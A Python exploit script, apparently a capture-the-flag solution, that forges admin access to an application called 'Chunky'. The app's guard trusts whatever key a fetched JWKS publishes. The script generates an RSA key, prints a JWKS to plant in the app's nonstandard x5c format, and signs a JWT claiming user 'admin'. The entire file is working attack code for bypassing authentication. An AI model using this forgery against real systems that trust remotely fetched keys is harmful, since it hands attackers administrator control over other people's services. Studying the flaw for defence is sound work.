#!/usr/bin/env python3
"""An RSA key, the JWKS that publishes it, and an admin token signed with it.

Chunky's admin guard fetches a JWKS over HTTP and trusts whatever public key it
finds there, so an attacker who controls that document controls who the
signature says you are. This prints the two halves of that: the JWKS to plant,
and a token the planted key verifies.

The JWKS shape is the application's own — `keys[0].x5c[0]`, base64 of a DER
SubjectPublicKeyInfo, which is what `admin.py` wraps in a PEM header before
handing it to PyJWT. It is not what `x5c` means in RFC 7517 (that field holds a
certificate), but it is what this application reads.

Needs `cryptography`; the token is assembled by hand rather than with PyJWT so
that is the only dependency.

    chunky_key.py            # line 1: the JWKS   line 2: the token
"""

import base64
import json

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa


def b64url(raw):
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def main():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    spki = key.public_key().public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    jwks = {"keys": [{"alg": "RS256", "x5c": [base64.b64encode(spki).decode()]}]}

    header = b64url(json.dumps({"alg": "RS256", "typ": "JWT"}, separators=(",", ":")).encode())
    claims = b64url(json.dumps({"user": "admin"}, separators=(",", ":")).encode())
    signed = ("%s.%s" % (header, claims)).encode()
    signature = key.sign(signed, padding.PKCS1v15(), hashes.SHA256())

    print(json.dumps(jwks, separators=(",", ":")))
    print("%s.%s" % (signed.decode(), b64url(signature)))


if __name__ == "__main__":
    main()
